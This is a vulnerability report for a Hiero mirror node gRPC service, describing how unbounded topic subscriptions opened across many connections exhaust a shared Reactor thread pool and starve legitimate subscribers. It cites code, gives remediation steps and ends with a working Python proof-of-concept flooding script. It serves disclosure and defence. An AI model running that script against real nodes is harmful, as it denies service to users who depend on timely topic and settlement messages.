### Title
Unbounded gRPC Subscription Resource Exhaustion via `boundedElastic` Thread Pool Depletion

### Summary
An unprivileged external user can open an arbitrary number of indefinite topic subscriptions (`limit=0`, no `endTime`) across multiple TCP connections, each consuming a thread from the shared `Schedulers.boundedElastic()` pool via `publishOn`. Because `maxConcurrentCallsPerConnection=5` only limits calls per connection and there is no global subscriber cap, an attacker using enough connections exhausts the bounded thread pool, starving legitimate subscribers of scheduler threads and preventing delivery of topic messages.

### Finding Description

**Filter validation — no upper bound on subscriptions:**
`TopicMessageFilter` enforces `@Min(0)` on `limit`, making `limit=0` (unbounded) fully valid. `endTime` is optional with no enforcement. There is no maximum subscriber count check anywhere in `TopicMessageServiceImpl.subscribeTopic()` — `subscriberCount` is a metric gauge only, never enforced. [1](#0-0) [2](#0-1) 

**Thread consumption per subscriber — `SharedTopicListener`:**
For the default `REDIS` listener type (and `SHARED_POLL`), `SharedTopicListener.listen()` calls `.publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch())`. Reactor's `publishOn` with `boundedElastic` assigns one worker thread per active subscriber for the lifetime of the subscription. On a high-volume topic with continuous messages, that thread is held continuously. [3](#0-2) 

**Additional `boundedElastic` usage per subscription:**
`TopicMessageServiceImpl.subscribeTopic()` also schedules a `safetyCheck` on `Schedulers.boundedElastic()` for every subscription, consuming an additional slot from the same default singleton pool. [4](#0-3) 

**Per-connection limit is insufficient:**
`maxConcurrentCallsPerConnection=5` limits calls per TCP connection but there is no limit on the number of TCP connections an attacker may open, and no total-connection or total-subscriber cap is configured. [5](#0-4) [6](#0-5) 

**`PollingTopicListener` (POLL mode) — independent pool, same pattern:**
When `type=POLL`, each `listen()` call creates its own `Schedulers.boundedElastic()` instance and schedules `RepeatSpec.times(Long.MAX_VALUE)` on it, holding scheduler resources indefinitely per subscription. [7](#0-6) 

### Impact Explanation
`Schedulers.boundedElastic()` defaults to `10 × availableProcessors` threads (e.g., 40 threads on a 4-core pod). Once exhausted, `publishOn` tasks queue up or are rejected with `RejectedExecutionException`, causing all active legitimate subscriptions to stall — no topic messages are delivered. For deployments where downstream systems rely on mirror-node gRPC subscriptions to detect settlement or fund-transfer events, missed notifications can result in missed settlement windows. The DoS is complete and persistent as long as the attacker holds connections open.

### Likelihood Explanation
No authentication is required to connect to the gRPC port. The attacker needs only `ceil(pool_size / 5)` TCP connections (e.g., 8 connections on a 4-core pod) to exhaust the pool. This is trivially achievable with a standard gRPC client library. The attack is repeatable and can be sustained indefinitely at negligible cost. The `maxRatePerEndpoint: 250` GCP gateway rate limit applies to request rate, not concurrent streaming connections, so it does not mitigate this. [8](#0-7) 

### Recommendation
1. **Enforce a global subscriber cap** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable maximum (e.g., `hiero.mirror.grpc.maxSubscribers`).
2. **Enforce a per-IP connection/subscription limit** at the Netty layer using `NettyServerBuilder.maxConnectionAge()` and a custom `ServerInterceptor` that tracks per-IP active call counts.
3. **Require a non-zero `limit` or a finite `endTime`** in `TopicMessageFilter` validation, or add a configurable maximum subscription duration.
4. **Use a dedicated, bounded scheduler** for `publishOn` in `SharedTopicListener` with an explicit thread cap, rather than the shared `Schedulers.boundedElastic()` singleton.

### Proof of Concept
```python
import grpc
import threading
from hedera import mirror_pb2, mirror_pb2_grpc

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = "<high-volume-topic>"
CONNECTIONS = 20  # 20 connections × 5 calls = 100 subscriptions

def flood_connection():
    channel = grpc.insecure_channel(TARGET)
    stub = mirror_pb2_grpc.ConsensusServiceStub(channel)
    threads = []
    for _ in range(5):  # maxConcurrentCallsPerConnection = 5
        def subscribe():
            req = mirror_pb2.ConsensusTopicQuery(
                topicID=TOPIC_ID,
                # limit=0 (default, unbounded), no consensusEndTime
            )
            for _ in stub.subscribeTopic(req):
                pass  # hold open, never cancel
        t = threading.Thread(target=subscribe, daemon=True)
        t.start()
        threads.append(t)

for _ in range(CONNECTIONS):
    threading.Thread(target=flood_connection, daemon=True).start()

# After ~8-20 connections, boundedElastic pool is exhausted.
# Legitimate subscribers receive no messages until attacker disconnects.
input("Attack running. Press Enter to stop.")
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/domain/TopicMessageFilter.java (L25-26)
```java
    @Min(0)
    private long limit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-56)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L67-70)
```java
        Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
                .filter(_ -> !topicContext.isComplete())
                .flatMapMany(_ -> missingMessages(topicContext, null))
                .subscribeOn(Schedulers.boundedElastic());
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/SharedTopicListener.java (L21-26)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        return getSharedListener(filter)
                .doOnSubscribe(s -> log.info("Subscribing: {}", filter))
                .onBackpressureBuffer(listenerProperties.getMaxBufferSize(), BufferOverflowStrategy.ERROR)
                .publishOn(Schedulers.boundedElastic(), false, listenerProperties.getPrefetch());
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L31-34)
```java
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L31-43)
```java
    private final Scheduler scheduler = Schedulers.boundedElastic();

    @Override
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
```

**File:** charts/hedera-mirror-grpc/values.yaml (L69-69)
```yaml
      maxRatePerEndpoint: 250  # Requires a change to HPA to take effect
```
